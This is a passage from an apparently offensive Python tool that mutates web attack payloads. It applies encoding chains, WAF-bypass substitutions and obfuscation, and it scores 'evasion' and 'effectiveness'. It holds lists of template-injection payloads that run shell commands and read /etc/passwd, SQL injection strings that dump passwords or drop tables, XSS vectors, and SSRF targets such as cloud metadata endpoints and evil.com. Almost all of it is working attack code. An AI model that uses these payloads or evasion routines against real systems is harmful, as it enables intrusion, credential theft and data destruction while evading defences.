            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${Class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{lipsum.__globals__.os.popen('id').read()}}",
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        ]

    def _apply_encoding_chains(self, payload: str) -> List[str]:
        """Apply multiple encoding chains"""
        variants = []

        # Single encodings
        for encoder_name, encoder_func in self.encoders.items():
            try:
                encoded = encoder_func(payload)
                variants.append(encoded)
            except:
                continue

        # Double encodings
        if self.encoding_chains >= 2:
            for encoder1_name, encoder1 in self.encoders.items():
                for encoder2_name, encoder2 in self.encoders.items():
                    if encoder1_name != encoder2_name:
                        try:
                            double_encoded = encoder2(encoder1(payload))
                            variants.append(double_encoded)
                        except:
                            continue

        return variants[:10]  # Limit to 10 variants

    def _apply_waf_bypasses(self, payload: str) -> List[str]:
        """Apply WAF-specific bypass techniques"""
        variants = []

        if self.waf_profile in self.waf_bypass_patterns:
            patterns = self.waf_bypass_patterns[self.waf_profile]

            for pattern in patterns:
                # Simple substitution-based bypass
                if "union" in payload.lower() and "union" in pattern:
                    variant = payload.lower().replace(
                        "union",
                        pattern.split("union")[1] if "union" in pattern else pattern,
                    )
                    variants.append(variant)
                elif "<script>" in payload and "<script>" in pattern:
                    variant = payload.replace(
                        "<script>",
                        (
                            pattern.split("<script>")[0]
                            if "<script>" in pattern
                            else pattern
                        ),
                    )
                    variants.append(variant)

        # Generic WAF bypasses
        generic_bypasses = [
            payload.replace(" ", "/**/"),
            payload.replace("=", "/**/=/**/"),
            payload.replace("(", "/**/("),
            payload.replace(")", ")/**/"),
            payload.replace(" AND ", " /*!AND*/ "),
            payload.replace(" OR ", " /*!OR*/ "),
        ]

        variants.extend(generic_bypasses)
        return variants[:8]  # Limit to 8 variants

    def _apply_obfuscation(self, payload: str) -> List[str]:
        """Apply advanced obfuscation techniques"""
        variants = []

        # Comment insertion
        if "script" in payload:
            variants.append(payload.replace("script", "scr/**/ipt"))

        # Case variation
        variants.append(
            "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
        )

        # Whitespace variation
        variants.append(payload.replace(" ", "\t"))
        variants.append(payload.replace(" ", "\n"))

        # Character substitution
        char_subs = {
            "a": "\\x61",
            "e": "\\x65",
            "i": "\\x69",
            "o": "\\x6f",
            "u": "\\x75",
        }

        variant = payload
        for char, sub in char_subs.items():
            variant = variant.replace(char, sub)
        variants.append(variant)

        return variants[:6]  # Limit to 6 variants

    def _detect_encoding(self, variant: str, original: str) -> List[str]:
        """Detect which encodings were applied"""
        applied_encodings = []

        if "%" in variant and "%" not in original:
            applied_encodings.append("url_encoding")
        if variant != variant.lower() and variant != variant.upper():
            applied_encodings.append("mixed_case")
        if "\\x" in variant:
            applied_encodings.append("hex_encoding")
        if "\\u" in variant:
            applied_encodings.append("unicode_encoding")

        return applied_encodings

    def _detect_bypass_techniques(self, variant: str) -> List[str]:
        """Detect which bypass techniques were used"""
        techniques = []

        if "/**/" in variant:
            techniques.append("comment_insertion")
        if variant != variant.lower() and variant != variant.upper():
            techniques.append("case_variation")
        if "\t" in variant or "\n" in variant:
            techniques.append("whitespace_manipulation")
        if "%00" in variant:
            techniques.append("null_byte_injection")

        return techniques

    def _calculate_effectiveness_score(self, payload: str) -> float:
        """Calculate payload effectiveness score (0-1)"""
        score = 0.5  # Base score

        # Complexity bonus
        if len(payload) > 50:
            score += 0.1

        # Encoding bonus
        if any(enc in payload for enc in ["%", "\\x", "\\u"]):
            score += 0.2

        # WAF bypass bonus
        if any(bypass in payload for bypass in ["/**/", "/*!", "%00"]):
            score += 0.2

        # Context-specific bonus
        if self.context in payload or self.technique in payload:
            score += 0.1

        return min(score, 1.0)

    def _detect_steganography(self, payload: str) -> str:
        """Detect steganography level in payload"""
        if any(char in payload for char in ["\\x", "\\u", "%"]):
            return "high"
        elif any(tech in payload for tech in ["/**/", "/*!", "\t", "\n"]):
            return "medium"
        elif payload != payload.lower() and payload != payload.upper():
            return "low"
        else:
            return "none"

    def _calculate_evasion_rating(self, payload: str) -> str:
        """Calculate evasion rating based on obfuscation techniques"""
        evasion_points = 0

        # Encoding techniques
        if "%" in payload:
            evasion_points += 2
        if "\\x" in payload or "\\u" in payload:
            evasion_points += 3

        # Comment-based evasion
        if "/**/" in payload or "/*!" in payload:
            evasion_points += 2

        # Case manipulation
        if payload != payload.lower() and payload != payload.upper():
            evasion_points += 1

        # Whitespace manipulation
        if "\t" in payload or "\n" in payload:
            evasion_points += 1

        # Null bytes or special characters
        if "%00" in payload or any(
            char in payload for char in ["\x00", "\x09", "\x0a"]
        ):
            evasion_points += 3

        if evasion_points >= 8:
            return "extreme"
        elif evasion_points >= 5:
            return "high"
        elif evasion_points >= 3:
            return "medium"
        elif evasion_points >= 1:
            return "low"
        else:
            return "basic"


# Legacy PayloadMutator for backward compatibility
class PayloadMutator:
    def __init__(self, context="html", technique="xss"):
        self.context = context.lower()
        self.technique = technique.lower()
        self.advanced_mutator = AdvancedPayloadMutator(context, technique)

    def mutate(self):
        """Legacy mutate method for backward compatibility"""
        mutations = self.advanced_mutator.mutate(count=10)
        return [m["payload"] for m in mutations]

    def _mutate_xss(self):
        base = "<script>alert(1)</script>"
        return [
            base,
            base.replace("alert", "al\u0065rt"),
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
            "<svg onload=alert(1)>",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<input onfocus=alert(1) autofocus>",
        ]

    def _mutate_sqli(self):
        return [
            # Basic authentication bypasses
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR '1'='1' /*",
            "' OR '1'='1'--",
            "' OR '1'='1' -- -",
            # Comment manipulation
            "'--",
            "';--",
            "'/*",
            "' OR '' = '",
            "' OR ''='",
            # Time-based (MySQL)
            "' OR sleep(5)--",
            "'; WAITFOR DELAY '00:00:05'--",  # MSSQL
            # Union injections
            "' UNION SELECT null, null--",
            "' UNION SELECT null, version()--",
            "' UNION SELECT username, password FROM users--",
            "' AND 1=0 UNION ALL SELECT NULL, NULL--",
            # Stack queries (if supported)
            "'; DROP TABLE users; --",
            "'; SELECT pg_sleep(5); --",
            # File reading / OS interaction (PostgreSQL / MySQL)
            "'||(SELECT load_file('/etc/passwd'))||'",
            "' OR 1=1; --",
            "' OR EXISTS(SELECT * FROM users)--",
            # Encoding / obfuscation
            "%27%20OR%20%271%27%3D%271",
            "'+OR+1=1--",
            # JSON-based injections
            '{"$ne": null}',
            "' OR JSON_EXTRACT(data, '$.password') = 'admin' --",
            # WAF bypass attempts
            "' OR 1=1 LIMIT 1 OFFSET 0 --",
            "'/**/OR/**/'1'='1",
            "' OR 1=1--+",
            "' OR '1'='1'--+",
        ]

    def _mutate_ssrf(self):
        return [
            "http://127.0.0.1",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::]:80/",
            "http://127.1/redirect?url=http://evil.com",
            "http://127.0.0.1@evil.com",
            "http://evil.com#@127.0.0.1",
            "http://example.com%09@127.0.0.1",
            "gopher://127.0.0.1:80/_GET / HTTP/1.0",
            "http://localhost/admin",
        ]


# === Optional standalone test ===
if __name__ == "__main__":
    aicli.main(standalone_mode=False)
